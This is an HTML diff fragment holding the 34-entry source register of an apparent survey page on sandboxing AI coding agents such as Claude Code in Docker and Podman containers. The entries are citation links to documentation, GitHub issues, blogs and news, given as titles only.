+        <span class="num">14</span>
+        <h3>Source register</h3>
+        <span class="note">34 citations</span>
+      </div>
+      <div class="src-grid">
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=code.claude.com&sz=128" alt=""><div><a href="https://code.claude.com/docs/en/sandbox-environments"><span class="n">01</span> Claude Code docs — Sandbox environments</a><div class="meta">official</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=code.claude.com&sz=128" alt=""><div><a href="https://code.claude.com/docs/en/devcontainer"><span class="n">02</span> Claude Code docs — Development containers</a><div class="meta">official</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=github.com&sz=128" alt=""><div><a href="https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh"><span class="n">03</span> anthropics/claude-code — init-firewall.sh</a><div class="meta">official · ⭐ 140k</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=github.com&sz=128" alt=""><div><a href="https://github.com/anthropics/claude-code/issues/36907"><span class="n">04</span> Issue #36907 — DNS bypass in init-firewall.sh</a><div class="meta">forum · ⭐ 140k</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=github.com&sz=128" alt=""><div><a href="https://github.com/VirtusLab/sandcat"><span class="n">05</span> VirtusLab/sandcat</a><div class="meta">official · ⭐ 171</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=agentcage.ai&sz=128" alt=""><div><a href="https://agentcage.ai/"><span class="n">06</span> agentcage</a><div class="meta">official</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=docs.docker.com&sz=128" alt=""><div><a href="https://docs.docker.com/engine/security/rootless/"><span class="n">07</span> Docker docs — Rootless mode</a><div class="meta">official</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=kenmuse.com&sz=128" alt=""><div><a href="https://www.kenmuse.com/blog/rootless-docker-and-its-hidden-security-trade-offs/"><span class="n">08</span> Rootless Docker and its hidden security trade-offs</a><div class="meta">vendor blog</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=arxiv.org&sz=128" alt=""><div><a href="https://arxiv.org/pdf/2606.08433"><span class="n">09</span> arXiv 2606.08433 — AI code sandbox engines compared</a><div class="meta">peer reviewed</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=docs.docker.com&sz=128" alt=""><div><a href="https://docs.docker.com/engine/security/seccomp/"><span class="n">10</span> Docker docs — Seccomp security profiles</a><div class="meta">official</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=securitylabs.datadoghq.com&sz=128" alt=""><div><a href="https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-6/"><span class="n">11</span> Datadog — Container security fundamentals, part 6</a><div class="meta">vendor blog</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=blog.nviso.eu&sz=128" alt=""><div><a href="https://blog.nviso.eu/2026/02/03/rootless-containers-with-podman/"><span class="n">12</span> NVISO Labs — Rootless containers with Podman</a><div class="meta">vendor blog</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=oneuptime.com&sz=128" alt=""><div><a href="https://oneuptime.com/blog/post/2026-03-04-rootless-pods-selinux-confinement-rhel-9/view"><span class="n">13</span> Rootless pods and SELinux confinement on RHEL 9</a><div class="meta">vendor blog</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=github.com&sz=128" alt=""><div><a href="https://github.com/anthropics/claude-code/blob/main/.devcontainer/devcontainer.json"><span class="n">14</span> anthropics/claude-code — devcontainer.json</a><div class="meta">official · ⭐ 140k</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=github.com&sz=128" alt=""><div><a href="https://github.com/anthropics/claude-code/blob/main/.devcontainer/Dockerfile"><span class="n">15</span> anthropics/claude-code — Dockerfile</a><div class="meta">official · ⭐ 140k</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=procustodibus.com&sz=128" alt=""><div><a href="https://www.procustodibus.com/blog/2022/10/wireguard-in-podman/"><span class="n">16</span> Pro Custodibus — WireGuard in Podman</a><div class="meta">vendor blog</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=github.com&sz=128" alt=""><div><a href="https://github.com/containers/podman/issues/12661"><span class="n">17</span> podman #12661 — modprobe ip_tables not permitted</a><div class="meta">forum · ⭐ 32k</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=github.com&sz=128" alt=""><div><a href="https://github.com/moby/moby/issues/45919"><span class="n">18</span> moby #45919 — rootless bind mounts owned by root</a><div class="meta">forum · ⭐ 72k</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=oneuptime.com&sz=128" alt=""><div><a href="https://oneuptime.com/blog/post/2026-03-17-use-userns-keep-id-option-podman/view"><span class="n">19</span> Using --userns=keep-id with Podman</a><div class="meta">vendor blog</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=seandheath.com&sz=128" alt=""><div><a href="https://seandheath.com/posts/vscode-dev-containers-with-rootless-podman/"><span class="n">20</span> VS Code Dev Containers with rootless Podman</a><div class="meta">vendor blog</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=code.claude.com&sz=128" alt=""><div><a href="https://code.claude.com/docs/en/network-config"><span class="n">21</span> Claude Code docs — Network configuration</a><div class="meta">official</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=docs.docker.com&sz=128" alt=""><div><a href="https://docs.docker.com/reference/compose-file/networks/"><span class="n">22</span> Docker docs — Compose networks reference</a><div class="meta">official</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=oneuptime.com&sz=128" alt=""><div><a href="https://oneuptime.com/blog/post/2026-02-08-how-to-use-docker-embedded-dns-server/view"><span class="n">23</span> Docker's embedded DNS server</a><div class="meta">vendor blog</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=docs.podman.io&sz=128" alt=""><div><a href="https://docs.podman.io/en/latest/markdown/podman-network-create.1.html"><span class="n">24</span> Podman docs — podman-network-create</a><div class="meta">official</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=github.com&sz=128" alt=""><div><a href="https://github.com/mattolson/agent-sandbox"><span class="n">25</span> mattolson/agent-sandbox</a><div class="meta">official · ⭐ 194</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=book.hacktricks.wiki&sz=128" alt=""><div><a href="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/abusing-docker-socket-for-privilege-escalation.html"><span class="n">26</span> HackTricks — Abusing the Docker socket</a><div class="meta">wiki</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=sentinelone.com&sz=128" alt=""><div><a href="https://www.sentinelone.com/vulnerability-database/cve-2026-6406/"><span class="n">27</span> SentinelOne — CVE-2026-6406</a><div class="meta">vendor blog</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=code.visualstudio.com&sz=128" alt=""><div><a href="https://code.visualstudio.com/remote/advancedcontainers/sharing-git-credentials"><span class="n">28</span> VS Code — Sharing git credentials with your container</a><div class="meta">official</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=thehackernews.com&sz=128" alt=""><div><a href="https://thehackernews.com/2026/02/claude-code-flaws-allow-remote-code.html"><span class="n">29</span> The Hacker News — Claude Code flaws allow RCE</a><div class="meta">news</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=news.ycombinator.com&sz=128" alt=""><div><a href="https://news.ycombinator.com/item?id=47545715"><span class="n">30</span> Hacker News — containing Claude Code</a><div class="meta">forum</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=containers.dev&sz=128" alt=""><div><a href="https://containers.dev/"><span class="n">31</span> Development Containers specification</a><div class="meta">official</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=github.com&sz=128" alt=""><div><a href="https://github.com/devcontainers/cli"><span class="n">32</span> devcontainers/cli</a><div class="meta">official · ⭐ 2.9k</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=docs.docker.com&sz=128" alt=""><div><a href="https://docs.docker.com/ai/sandboxes/"><span class="n">33</span> Docker docs — Sandboxes</a><div class="meta">official</div></div></div>
+        <div class="src"><img src="https://www.google.com/s2/favicons?domain=github.com&sz=128" alt=""><div><a href="https://github.com/agentcage/agentcage"><span class="n">34</span> agentcage/agentcage</a><div class="meta">official · ⭐ 21</div></div></div>
+      </div>
+    </section>
+
+    <div class="footnote">
+      Console view of a survey-depth Scout page · 34 citations · <a href="../">read the canonical</a> · <a href="../../">parent expedition</a> · <a href="/">Atlas</a>
+    </div>
+
+  </div>
+</div>
